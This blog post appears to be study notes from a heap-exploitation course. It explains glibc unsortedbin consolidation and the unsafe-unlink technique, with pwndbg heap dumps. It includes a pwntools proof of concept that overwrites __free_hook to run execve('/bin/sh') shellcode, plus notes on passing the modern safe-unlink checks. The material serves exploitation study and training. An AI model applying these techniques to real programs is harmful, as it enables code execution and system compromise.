---
layout: post
title:  "HeapLAB 1 - Unsafe Unlink"
date:   2022-12-07 20:00:01 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## General

`fastbin dup` and `tcache dup` techniques are only relevant for small chunks, that meet `size < 0x80`. \

Another bin, the `unsortedbin`, is relevant for larger allocations. 

This bin is relevant for the *unsafe unlink* technique.


## Unlinking

When calling `free` on a chunk size that corresponds to a `fastbin`, it have no impact on the surrounding chunks. \
Meaning - the heap content remains exactly the same (even the `PREV_INUSE` flag, doesn't hold for `fastbins`). 

However, upon freeing an `unsortedbin` size chunk, the heap layout changes.

Usually `partial unlink` refers to `unsortedbin, smallbin` unlinking, where `full unlink`refers to `largebin, bitmap search` unlink. 

Assume the following code:

```c
void* a = malloc(0x88);
void* b = malloc(0x88);
free(b);
```

Before `free`:

```bash
pwndbg> vis

0x602000        0x0000000000000000      0x0000000000000091      ................
0x602010        0x0000000000000000      0x0000000000000000      ................
0x602020        0x0000000000000000      0x0000000000000000      ................
0x602030        0x0000000000000000      0x0000000000000000      ................
0x602040        0x0000000000000000      0x0000000000000000      ................
0x602050        0x0000000000000000      0x0000000000000000      ................
0x602060        0x0000000000000000      0x0000000000000000      ................
0x602070        0x0000000000000000      0x0000000000000000      ................
0x602080        0x0000000000000000      0x0000000000000000      ................
0x602090        0x0000000000000000      0x0000000000000091      ................
0x6020a0        0x0000000000000000      0x0000000000000000      ................
0x6020b0        0x0000000000000000      0x0000000000000000      ................
0x6020c0        0x0000000000000000      0x0000000000000000      ................
0x6020d0        0x0000000000000000      0x0000000000000000      ................
0x6020e0        0x0000000000000000      0x0000000000000000      ................
0x6020f0        0x0000000000000000      0x0000000000000000      ................
0x602100        0x0000000000000000      0x0000000000000000      ................
0x602110        0x0000000000000000      0x0000000000000000      ................
0x602120        0x0000000000000000      0x0000000000020ee1      ................         <-- Top chunk
```

After `free`:

```bash
pwndbg> vis

0x602000        0x0000000000000000      0x0000000000000091      ................
0x602010        0x0000000000000000      0x0000000000000000      ................
0x602020        0x0000000000000000      0x0000000000000000      ................
0x602030        0x0000000000000000      0x0000000000000000      ................
0x602040        0x0000000000000000      0x0000000000000000      ................
0x602050        0x0000000000000000      0x0000000000000000      ................
0x602060        0x0000000000000000      0x0000000000000000      ................
0x602070        0x0000000000000000      0x0000000000000000      ................
0x602080        0x0000000000000000      0x0000000000000000      ................
0x602090        0x0000000000000000      0x0000000000020f71      ........q.......         <-- Top chunk
```

Meaning the `b` chunk was completely coalesced to the `top chunk`!

The following rule holds:

*In case a chunk adjacent to the top chunk is freed, and it does not qualify for any fastbin, it will be coalesced to the top chunk*

Indeed, we can see the `unsortedbin` remained empty upon `free(b)`. 

### unsortedbin

There is only *one* `unsortedbin` per arena. \
This is a doubly-linked (uses `fd, bk` ptrs), circular list, that *holds chunks of any size*. 

Therefore, the `main_arena` only contains two pointers of the `unsortedbin`: `unsortedbin_fd, unsortedbin_bk`.

Freed chunks are registered within the `unsortedbin` head. \
Unlike `fastbins`, allocations are being made from the *tail* of the bin. 

In case we would `free` a non-top-chunk-adjacent `unsortedbin` chunk, few heap changes would occur:

1. The `PREV_INUSE` flag of the succeeding chunk is cleared.

2. The last quadword of the freed chunk `user_data`, now repurposed as the `PREV_SIZE` field of the succeeding chunk. 

3. The `fd, bk` ptrs of the freed chunks are set.

Note: upon freeing the first `unsortedbin` chunk, its `fd, bk` ptrs would point towards a *fake chunk* on the main arena (where its `PREV_SIZE` field repurposed as the `top_chunk` ptr).

This fake chunk's `fd, bk` ptrs are initialized to point toward the freed unsorted chunk:

```bash
pwndbg> vis

0x602000        0x0000000000000000      0x0000000000000091      ................         <-- unsortedbin[all][0]
0x602010        0x00007ffff7dd0bc0      0x00007ffff7dd0bc0      ................
0x602020        0x0000000000000000      0x0000000000000000      ................

pwndbg> x/20gx &main_arena
0x7ffff7dd0b60 <main_arena>:    0x0000000000000000      0x0000000000000000
0x7ffff7dd0b70 <main_arena+16>: 0x0000000000000000      0x0000000000000000
0x7ffff7dd0b80 <main_arena+32>: 0x0000000000000000      0x0000000000000000
0x7ffff7dd0b90 <main_arena+48>: 0x0000000000000000      0x0000000000000000
0x7ffff7dd0ba0 <main_arena+64>: 0x0000000000000000      0x0000000000000000
0x7ffff7dd0bb0 <main_arena+80>: 0x0000000000000000      0x0000000000000000
0x7ffff7dd0bc0 <main_arena+96>: 0x0000000000602140      0x0000000000000000
0x7ffff7dd0bd0 <main_arena+112>:        0x0000000000602000      0x0000000000602000
```

### Consolidation

Upon freeing the two chunks allocated above, a *coalescing* is being made - hence creating a large, freed hole within the heap:

```bash
pwndbg> vis

0x602000        0x0000000000000000      0x0000000000000121      ........!.......         <-- unsortedbin[all][0]
0x602010        0x00007ffff7dd0bc0      0x00007ffff7dd0bc0      ................
0x602020        0x0000000000000000      0x0000000000000000      ................
0x602030        0x0000000000000000      0x0000000000000000      ................
0x602040        0x0000000000000000      0x0000000000000000      ................
0x602050        0x0000000000000000      0x0000000000000000      ................
0x602060        0x0000000000000000      0x0000000000000000      ................
0x602070        0x0000000000000000      0x0000000000000000      ................
0x602080        0x0000000000000000      0x0000000000000000      ................
0x602090        0x0000000000000090      0x0000000000000090      ................
0x6020a0        0x0000000000000000      0x0000000000000000      ................
0x6020b0        0x0000000000000000      0x0000000000000000      ................
0x6020c0        0x0000000000000000      0x0000000000000000      ................
0x6020d0        0x0000000000000000      0x0000000000000000      ................
0x6020e0        0x0000000000000000      0x0000000000000000      ................
0x6020f0        0x0000000000000000      0x0000000000000000      ................
0x602100        0x0000000000000000      0x0000000000000000      ................
0x602110        0x0000000000000000      0x0000000000000000      ................
0x602120        0x0000000000000120      0x0000000000000020       ....... .......
0x602130        0x0000000000000000      0x0000000000000000      ................
0x602140        0x0000000000000000      0x0000000000020ec1      ................         <-- Top chunk
```

Key notes:

1. The succeeding fast chunk, whose size field was `0x21`, have turned off the `PREV_INUSE` bit. \
Moreover, its `PREV_SIZE` field has been set to `0x120`. 

2. The `fd, bk` ptrs of the freed chunks weren't set. \
Moreover, the `fd, bk` ptrs of the first freed chunk weren't changed at all. The `unsortedbin` wasn't changed. 

3. The size of the first freed chunk was increased from `0x91` to `0x121`

The consolidation algorithm:

1. Checks whether either adjacent chunk is available for consolidation, via the `PREV_INUSE` flags. \
In case this bit is on, it means consolidation with the previous chunk is possible. Malloc would find this chunk, via the `PREV_SIZE` field of the current chunk. \
In case this bit is off, it looks forward *two chunks*, using their `SIZE` fields, and checks the `PREV_INUSE` flag of the succeeding chunk next chunk (as this is the only way to know if the *SUCCEEDING* chunk is in use).

2. In case a consolidation candidate was found, it must remove the candidate from which ever freelist theyre already linked to. Otherwise, the chunk may get linked twiced. 

3. Malloc calculates the new large chunk size, and updates its `size` and `prev_size` fields. 

4. The new consolidated chunk is linked to the `unsortedbin`.

Note that multiple consolidations may occur with a single `free` call. \
For example, consolidating a preceding chunk, creating a large chunk that may be consolidated with the `top_chunk`, would result with a double consolidation.

The advantage of doubly-linked lists, is the fast unlinking algorithmm (which finds the preceding chunk in `O(1), read chunk->bk`), which cannot be performed on a singly-linked lists. 

## Old Exploitation

Old GLIBC versions used a simple macro, without any integrity checks, to unlink a chunk from an `unsortedbin`. \
This technique is called `unsafe unlink`. 

Chunks are considered `small` if their size is less than `0x400`. 

We're given a binary, that allows 2 `malloc` allocations. \ 
I can perform an allocation of two chunks of size `0x88` (so they will be within the `unsortedbin` size), and free the first allocated chunk. \
Recall that freeing the second-allocated chunk would lead to coalescing with the `top_chunk`. 

A trick to view the main heap layout:

```bash
pwndbg> dq mp_.sbrk_base
```

A cool technique is overwriting the `PREV_INUSE` flag of certain chunk, hence treating the previous allocated chunk as a free, which makes it a consolidation candidate. 

Recall that upon consolidation, Malloc first *unlinks the candidate chunk from its bin*, even if the coalescing can be made without any unlinking (not trivial). \
This is because of the de-allocation policy - the newly freed chunk must be added towards the head of the bin. \
Therefore, the candidate is the one being added to the newly freed chunk, creating a large free chunk that is stored within the bin's head.


It basically means the following for chunk `A`:

```c
(A->bk)->fd = A->fd; 
(A->fd)->bk = A->bk;
```

Meaning:

```c
*((A->bk) + 0x10) = A->fd;
*((A->fd) + 0x18) = A->bk;
```

We can also write these rules in a more explicit form, however it might be confusing:

```c
*(*(A + 0x18) + 0x10) = *(A + 0x10)
*(*(A + 0x10) + 0x18) = *(A + 0x18)
```

In case I'd pick the following:

```c
(A->fd) + 0x18 = __free_hook_libc_addr; // A->fd = __free_hook_libc_addr - 0x18
(A->bk) = shellcode_heap_addr; 
```

It implies that `shellcode_heap_addr + 0x10` must be a writeable memory. This may limit our shellcode size to 16 bytes.

The other choice:

```c
(A->bk) + 0x10 = __free_hook_libc_addr; // A->bk = __free_hook_libc_addr - 0x10
(A->fd) = shellcode_heap_addr
```

It implies that `shellcode_heap_addr + 0x18` must be a writeable memory. This is much better, and gives us 8 crucial bytes. 

Note - the shellcode size limitation can be easily bypassed, by adding a `jmp <OFFSET_OF_AT_LEAST 16+8 BYTES>` at the start of the shellcode.

Full POC:

```python
# Prepare execve("/bin/sh") shellcode with a jmp over where the fd will be written.
shellcode = asm("jmp shellcode;" + "nop;"*0x30 + "shellcode:" + shellcraft.execve("/bin/sh"))

chunk_a = malloc(0x88)
chunk_b = malloc(0x88)

fd = p64(heap + 0x20)
bk = p64(libc.sym.__free_hook - 0x10)
prev_size = p64(0x90)
fake_size = p64(0x90)  # clears the PREV_INUSE bit
edit(chunk_a, fd + bk + shellcode + b"A"*(0x70-len(shellcode))+ prev_size + fake_size)

# Overwrite __free_hook via unsafe unlink
free(chunk_b)

# Trigger __free_hook
free(chunk_a)
```

This exploit uses the `backward consolidation` - as the fake `fd, bk` held within the chunk preceding the chunk being freed. \
There is also a `forward consolidation` variant, where the fake `fd, bk` reside within the succeeding chunk. 

## Modern Exploitation

The modern version of the unlinking technique, `safe unlink`, is abit more complex, as mitigations were added. 

The new partial unlinking algorithm introduces 3 new integrity checks:

1. `chunksize(p) != prev_size(next_chunk(p))`

In case we control the `prev_size` of the succeeding chunk after the one that is being freed, which is in our case - this can be easily bypassed. 

2. `fd->bk != p || bk->fd != p`

This is an harsh mitigation. We have to write near the fake target addresses, `bk, fd` ptrs that points back to the chunk being freed. 

3. `p->fd_nextsize->bk_nextsize != p || p->bk_nextsize->fd_nextsize != p`

Relevant only for `largebins`. 

The example binary contains a `glibc = 2.30`, with `NX, ASLR, Full RELRO, canary`. 

There are also pointers of the heap stored at the `.bss`. \
The trick is to use these pointers, so that the `safe_unlink` checks may pass. 

As with the `unsafe unlink`, the following 2 writes would happen:

```c
*(A->bk + 0x10) = A->fd;
*(A->fd + 0x18) = A->bk;
```

Moreover, the new constraints due to the improved mitigation are (assuming the `size` check can be easily bypassed):

```c
(A->bk)->fd == A
(A->fd)->bk == A
```

Meaning:

```c
*(A->bk + 0x10) == A
*(A->fd + 0x18) == A
```

Meaning a total of 2 writes, and 2 constraints:

```c
*(A->bk + 0x10) = A->fd;
*(A->fd + 0x18) = A->bk;
*(A->bk + 0x10) == A
*(A->fd + 0x18) == A
```

Recall that the writes are only being made after the constraints have succesfully passed. \
It *DOESN'T* mean the solution must enforce the following criteria: `A->fd == A->bk == A`.

So the trick is to find addresses that holds a pointer towards the heap's chunk, `A`. \
These addresses would be overwritten. \
Note that it is actually pretty common to see global pointers towards the heap. 

On the example binary, we have `m_array`, which is a global pointer at `0x602010`, that stores the value of `A` address, `0x603000`.

In case we set `A->fd + 0x18` to the address of `m_array`, the last check would pass - because `*(0x602010) == 0x603000`. \
The same holds for `A->bk + 0x10`. \

So the two constraints are being translated to:

```c
A->bk = &m_array - 0x10
A->fd = &m_array - 0x18
```

This would result with corrupting the quadword at `&m_array`, however succesfully unlinking the chunk to a wrong place. 